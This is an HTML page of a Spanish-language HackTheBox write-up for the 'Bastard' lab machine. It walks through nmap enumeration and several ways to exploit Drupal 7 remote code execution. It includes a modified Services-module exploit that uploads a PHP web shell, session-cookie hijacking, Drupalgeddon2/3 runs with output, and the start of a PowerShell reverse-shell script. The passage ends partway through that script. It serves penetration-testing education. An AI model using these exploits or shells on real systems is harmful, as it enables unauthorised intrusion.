@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Bastard - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Bastard - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a estar resolviendo la maquina Bastard de hackthebox que es una maquina Windows de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de Drupal con la que obtendremos ejecución remota de comandos - esto lo haremos de maneras alternativas, despues una vez tengamos acceso al sistema usaremos la herramienta sherlock para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un exploit con el que nos permita elevar nuestro privilegio para convertirmos en el usuario administrator." />
+<meta property="og:description" content="El dia de hoy vamos a estar resolviendo la maquina Bastard de hackthebox que es una maquina Windows de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de Drupal con la que obtendremos ejecución remota de comandos - esto lo haremos de maneras alternativas, despues una vez tengamos acceso al sistema usaremos la herramienta sherlock para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un exploit con el que nos permita elevar nuestro privilegio para convertirmos en el usuario administrator." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Bastard" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Bastard" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Bastard/bastard.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-04-28T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Bastard/bastard.png" />
+<meta property="twitter:title" content="Maquina Bastard - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-04-28T00:00:00+00:00","datePublished":"2023-04-28T00:00:00+00:00","description":"El dia de hoy vamos a estar resolviendo la maquina Bastard de hackthebox que es una maquina Windows de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de Drupal con la que obtendremos ejecución remota de comandos - esto lo haremos de maneras alternativas, despues una vez tengamos acceso al sistema usaremos la herramienta sherlock para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un exploit con el que nos permita elevar nuestro privilegio para convertirmos en el usuario administrator.","headline":"Maquina Bastard - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Bastard/bastard.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Bastard"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Bastard"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Bastard - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-04-28">28 Apr 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Bastard/bastard.png" alt="Maquina Bastard - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a estar resolviendo la maquina Bastard de <code>hackthebox</code> que es una maquina <code>Windows</code> de dificultad <code>Media</code>. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de <code>Drupal</code> con la que obtendremos ejecución remota de comandos - <code>esto lo haremos de maneras alternativas</code>, despues una vez tengamos acceso al sistema usaremos la herramienta <code>sherlock</code> para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un <code>exploit</code> con el que nos permita elevar nuestro privilegio para convertirmos en el usuario <code>administrator</code>.</p>
+
+<p>Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Bastard
+❯ ls
+ Bastard
+</code></pre>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap
+</code></pre>
+
+<h2 id="enumeración">Enumeración <a href="#enumeración">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.9
+PING 10.10.10.9 (10.10.10.9) 56(84) bytes of data.
+64 bytes from 10.10.10.9: icmp_seq=1 ttl=127 time=123 ms
+
+--- 10.10.10.9 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 123.143/123.143/123.143/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde con un <code>ttl</code> de <code>127</code> correspondiente a una maquina <code>windows</code>, ahora procederemoscon el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.9 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:54 GMT
+Initiating SYN Stealth Scan at 00:54
+Scanning 10.10.10.9 [65535 ports]
+Discovered open port 135/tcp on 10.10.10.9
+Discovered open port 80/tcp on 10.10.10.9
+Discovered open port 49154/tcp on 10.10.10.9
+Completed SYN Stealth Scan at 00:54, 26.61s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.9
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-04-29 00:54:22 GMT for 26s
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE REASON
+80/tcp    open  http    syn-ack ttl 127
+135/tcp   open  msrpc   syn-ack ttl 127
+49154/tcp open  unknown syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds
+           Raw packets sent: 131085 (5.768MB) | Rcvd: 23 (1.012KB)
+</code></pre>
+
+<p>Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  <code>80 http</code> , <code>135 rpc</code> y <code>49154 rpc</code>.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p80,135,49154 10.10.10.9 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:55 GMT
+Nmap scan report for 10.10.10.9
+Host is up (0.18s latency).
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Microsoft IIS httpd 7.5
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Welcome to Bastard | Bastard
+|_http-generator: Drupal 7 (http://drupal.org)
+135/tcp   open  msrpc   Microsoft Windows RPC
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.71 seconds
+</code></pre>
+
+<p>Visulizamos la versión de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>Microsoft IIS httpd 7.5</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>49154</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Primeramente ya que <code>nmap</code> nos reporto que el puerto <code>80</code> se encuentra abierto usaremos <code>whatweb</code> para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.9
+http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
+</code></pre>
+
+<p>La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a un <code>Drupal 7</code>, ademas vemos que esta desarrollado en <code>PHP</code> y <code>ASP.NET</code></p>
+
+<blockquote>
+  <p>Drupal: Drupal es un sistema de gestión de contenidos o CMS libre, modular, multipropósito y muy configurable que permite publicar artículos, imágenes, archivos y que también ofrece la posibilidad de otros servicios añadidos como foros, encuestas, votaciones, blogs, administración de usuarios y permisos.</p>
+</blockquote>
+
+<p>Vamos a proceder a abrir el servicio web en el navegador</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal1.PNG" alt="" /></p>
+
+<p>Como concretamente vimos que la version de <code>drupal</code> que esta utilizando corresponde a la version <code>7</code>, podemos tratar de buscar <code>vulnerablidades</code> asociadas a esta versión. Para ello usaremos <code>searchsploit</code></p>
+
+<pre><code class="language-bash">❯ searchsploit drupal 7.x
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Drupal 7.x Module Services - Remote Code Execution                                                                                                   | php/webapps/41564.php
+Drupal &lt; 7.34 - Denial of Service                                                                                                                    | php/dos/35415.txt
+Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                             | php/webapps/44557.rb
+Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                          | php/webapps/44542.txt
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
+Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                | php/remote/46510.rb
+Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                                                                                       | php/webapps/46452.txt
+Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                                                                                   | php/webapps/46459.py
+Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                    | php/webapps/44501.txt
+Drupal Module CKEditor &lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                               | php/webapps/25493.txt
+Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                        | php/remote/40144.php
+Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                    | php/remote/40130.rb
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Podemos ver varias vulnerabilidades asociadas a la versión que corresponden a <code>RCE (ejecucion remota de comandos)</code>.Usaremos el primer <code>exploit</code> que corresponde a uno en <code>php</code>, para ello vamos a proceder a traernoslo a nuestro directorio de trabajo.</p>
+
+<pre><code class="language-bash">❯ searchsploit -x php/webapps/41564.php
+❯ ls
+ 41564.php
+</code></pre>
+
+<p>Este <code>exploit</code> aprovecha una inyeccion <code>sql</code> para obtener la cache del endpoint y credenciales de administrador en hash, para despues tratar de subir un archivo <code>php</code>.</p>
+
+<pre><code class="language-php"># Initialization
+
+error_reporting(E_ALL);
+
+define('QID', 'anything');
+define('TYPE_PHP', 'application/vnd.php.serialized');
+define('TYPE_JSON', 'application/json');
+define('CONTROLLER', 'user');
+define('ACTION', 'login');
+
+$url = 'http://vmweb.lan/drupal-7.54';
+$endpoint_path = '/rest_endpoint';
+$endpoint = 'rest_endpoint';
+
+$file = [
+    'filename' =&gt; 'dixuSOspsOUU.php',
+    'data' =&gt; '&lt;?php eval(file_get_contents(\'php://input\')); ?&gt;'
+];
+
+$browser = new Browser($url . $endpoint_path);
+</code></pre>
+
+<p>Para utulizar el <code>exploit</code>, primero debemos cambiar ciertas variables que define el <code>exploit</code> como la <code>url</code> y el <code>endpoint_path</code>. En este caso debemos verificar si <code>rest_endpoint</code> existe.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal2.PNG" alt="" /></p>
+
+<p>Vemos que <code>rest_endpoint</code> no existe asi que podemos tratar usar un poco de <code>guesing</code> y probar la ruta <code>rest</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal3.PNG" alt="" /></p>
+
+<p>Efectivamente vemos que se cambio la ruta por defecto a <code>rest</code>, claro que de no haber acertado de esta forma, podriamos realizar un ataque de fuerza bruta para descubrir esta ruta como una manera alterna de hacerlo.</p>
+
+<p>Pues viendo que esta ruta si es valida tbm lo modificaremos en el <code>exploit</code>.</p>
+
+<p>Finalmente vamos a modificar el archivo que crea por defecto, y vamos a crear uno propio. Este codigo nos permitira ejecutar comandos en la maquina victima mediante el parametro <code>cmd</code> a traves de la función <code>shell_exec</code>.</p>
+
+<pre><code class="language-php">&lt;?php
+    echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;";
+?&gt;
+</code></pre>
+
+<p>El exploit procederia a quedarnos de la siguiente manera con los cambios realizados.</p>
+
+<pre><code class="language-php"># Initialization
+
+error_reporting(E_ALL);
+
+define('QID', 'anything');
+define('TYPE_PHP', 'application/vnd.php.serialized');
+define('TYPE_JSON', 'application/json');
+define('CONTROLLER', 'user');
+define('ACTION', 'login');
+
+$url = 'http://10.10.10.9';
+$endpoint_path = '/rest';
+$endpoint = 'rest_endpoint';
+
+$file = [
+    'filename' =&gt; 'pwn.php',
+    'data' =&gt; '&lt;?php echo "&lt;pre&gt;" . shell_exec($_REQUEST[\'cmd\']) . "&lt;/pre&gt;"; ?&gt;'
+];
+
+$browser = new Browser($url . $endpoint_path);
+</code></pre>
+
+<p>Ahora procedemos a ejecutar el <code>exploit</code>.</p>
+
+<pre><code class="language-bash">❯ php drupal.php
+# Exploit Title: Drupal 7.x Services Module Remote Code Execution
+# Vendor Homepage: https://www.drupal.org/project/services
+# Exploit Author: Charles FOL
+# Contact: https://twitter.com/ambionics
+# Website: https://www.ambionics.io/blog/drupal-services-module-rce
+
+
+#!/usr/bin/php
+Stored session information in session.json
+Stored user information in user.json
+Cache contains 7 entries
+File written: http://10.10.10.9/pwn.php
+❯ ls
+ drupal.php   session.json   user.json
+</code></pre>
+
+<p>VIsualizamos que el archivo nos lo sube en la ruta principal, lo siguiente sera validar el archivo subido.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal4.PNG" alt="" /></p>
+
+<p>Lo que ahora nos quedaria hacer, es enviarnos una <code>revershell</code> a nuestra maquina.</p>
+
+<p>De manera alternativa para ganar acceso vimos que antes, al ejecutar el <code>exploit</code>, nos creo un archivo <code>session.json</code> que contiene la sesion de usuario <code>admin</code>.</p>
+
+<pre><code class="language-json">{
+    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
+    "session_id": "nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c",
+    "token": "F_Tzii9LQfqeF9ekHCP4qTIGp1VYlIU0fuG2LiIfwIA"
+}
+</code></pre>
+
+<p>Podemos cambiar nuestra <code>cookie</code> de sesión de manera simple con la opción <code>inspeccionar</code>, insertando el <code>session_name</code> en el campo <code>nombre</code> y el <code>session_id</code> en <code>valor</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal5.PNG" alt="" /></p>
+
+<p>Una vez insertados los campos recargamos la pagina y ya estariamos logeados como el usuario <code>admin</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal6.PNG" alt="" /></p>
+
+<p>Ahora que somos el ususario <code>admin</code>, podriamos dirigirnos a la opción <code>Modules</code> y activar la opción de <code>PHP filter</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal9.PNG" alt="" /></p>
+
+<p>Despues agregamos un nuevo contenido en <code>content</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal7.PNG" alt="" /></p>
+
+<p>Vamos a la opción <code>articule</code> y agregamos un nombre, en el cuerpo podemos ejecutar codigo <code>php</code>. En este caso usare un codigo <code>reverse shell</code> en <code>windows</code>.</p>
+
+<p>Puedes usar este codigo, solo necesitas cambiar la <code>ip</code> y <code>puerto</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php">https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</a></li>
+</ul>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal8.PNG" alt="" /></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal13.PNG" alt="" /></p>
+
+<p>Establecemos en formato el de <code>PHP code</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal11.PNG" alt="" /></p>
+
+<p>Nos en escucha por el puerto que configuramos en el <code>codigo</code> en mi caso en el puerto <code>443</code>. Finalmente seleccionamos en la opción <code>Preview</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal12.PNG" alt="" /></p>
+
+<p>Y habriamos ganado acceso como el usuario <code>iis apppool\drupal</code>.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.9.
+Ncat: Connection from 10.10.10.9:49279.
+SOCKET: Shell has connected! PID: 2644
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\inetpub\drupal-7.54&gt;whoami
+iis apppool\drupal
+
+C:\inetpub\drupal-7.54&gt;
+</code></pre>
+
+<p>Como segunda forma alternativa, podemos hacer uso del exploit <code>drupalgeddon2</code>. Podemos encontrar el exploit usando <code>searchsploit</code>.</p>
+
+<pre><code class="language-bash">❯ searchsploit drupalgeddon2
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Esta hecho en <code>ruby</code> por lo que debemos tenerlo instalado para poder ejecutarlo. Lo que conseguiremos con este exploit es ganar acceso a la maquina victima mediante <code>RCE</code>.</p>
+
+<p>Como requisito lo mas probable es que te pida instalar la gema <code>highline</code>, lo cual se realiza del siguiente modo.</p>
+
+<pre><code class="language-bash">❯ gem install highline
+Fetching highline-2.1.0.gem
+Successfully installed highline-2.1.0
+Parsing documentation for highline-2.1.0
+Installing ri documentation for highline-2.1.0
+Done installing documentation for highline after 2 seconds
+1 gem installed
+</code></pre>
+
+<p>Una vez instalada podemos ejecutar el exploit correctamente.</p>
+
+<pre><code class="language-bash">❯ ruby drupalgeddon.rb
+Usage: ruby drupalggedon2.rb &lt;target&gt; [--authentication] [--verbose]
+Example for target that does not require authentication:
+       ruby drupalgeddon2.rb https://example.com
+Example for target that does require authentication:
+       ruby drupalgeddon2.rb https://example.com --authentication
+</code></pre>
+
+<p>Lo unico que le necesitamos proporcionar es el target en este caso la ip de la maquina victima.</p>
+
+<pre><code class="language-bash">❯ ruby drupalgeddon.rb http://10.10.10.9
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://10.10.10.9/
+</code></pre>
+
+<p>La herramienta te automatiza el proceso para ganar acceso como el usuario <code>nt authority\iusr</code></p>
+
+<pre><code class="language-bash">[*] Dropping back to direct OS commands
+drupalgeddon2&gt;&gt; whoami
+nt authority\iusr
+drupalgeddon2&gt;&gt; ipconfig
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.10.9
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+
+Tunnel adapter isatap.{56FEC108-3F71-4327-BF45-2B4EE355CD0F}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 9:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+</code></pre>
+
+<p>Como tercera alternativa, tenemos el <code>drupalgeddon3</code>, del repositorio de:</p>
+
+<ul>
+  <li><a href="https://github.com/oways/SA-CORE-2018-004">https://github.com/oways/SA-CORE-2018-004</a></li>
+</ul>
+
+<p>Nos clonamos el respositorio y tenemos un script hecho el <code>python3</code>.</p>
+
+<pre><code class="language-bash">❯ git clone https://github.com/oways/SA-CORE-2018-004
+Clonando en 'SA-CORE-2018-004'...
+remote: Enumerating objects: 15, done.
+remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15
+Recibiendo objetos: 100% (15/15), 106.84 KiB | 475.00 KiB/s, listo.
+Resolviendo deltas: 100% (2/2), listo.
+❯ cd SA-CORE-2018-004
+❯ ls
+ drupalgeddon3.py   example.png   README.md
+</code></pre>
+
+<pre><code class="language-bash">❯ python3 drupalgeddon3.py
+
+[Usage]
+python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]
+
+[Example]
+python drupalgeddon3.py http://target/drupal/ "SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0" 6 "uname -a"
+</code></pre>
+
+<p>Al ejecutarlo nos pide el <code>target</code> y la <code>session</code> que habriamos obtenido anteriormente con el primer <code>exploit</code>, seguidamente nos pide un <code>nodo</code> existente que lo podemos ver en la opción <code>content &gt; find content</code> y en <code>REST</code> haciendo <code>hovering (pasar el mouse encima de la opción)</code> vemos el numero de <code>nodo</code> y finalmente el comando que queremos ejecutar.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal14.PNG" alt="" /></p>
+
+<pre><code class="language-bash">❯ python3 drupalgeddon3.py http://10.10.10.9 "SESSd873f26fc11f2b7e6e4aa0f6fce59913=nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c" 1 "whoami"
+nt authority\iusr
+</code></pre>
+
+<p>El exploit funciona correctamente y esta seria la tercera forma de ganar acceso al sistema.</p>
+
+<p>Para ganar al sistema de manera mas comoda usare el primer metodo, para usando la herramienta <code>nishang</code> y obtener acceso en una <code>powershell</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></li>
+</ul>
+
+<p>Para matar dos pajaros de un tiro, como es de costumbre añadiremos al final del <code>script</code> la ejecución del comando que nos otorgue la conexión una vez este se interprete.</p>
+
+<pre><code class="language-powershell">function Invoke-PowerShellTcp 
+{ 
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
